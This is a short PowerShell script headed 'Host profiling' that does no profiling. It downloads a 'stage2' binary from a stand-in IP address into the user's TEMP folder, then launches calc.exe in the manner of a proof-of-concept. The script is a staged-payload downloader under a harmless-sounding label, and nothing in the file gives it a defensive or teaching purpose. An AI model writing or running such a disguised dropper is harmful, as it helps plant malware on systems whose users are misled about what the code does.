<# Host profiling #>
[CmdletBinding()]
param(
    [string]$TargetUrl = 'https://203.0.113.88/cdn/stage2.bin',
    [string]$LocalPath = "$env:TEMP\stage1.bin"
)
(New-Object System.Net.WebClient).DownloadFile($TargetUrl, $LocalPath)
Start-Process -FilePath 'calc.exe'
Set-Location -Path $env:TEMP
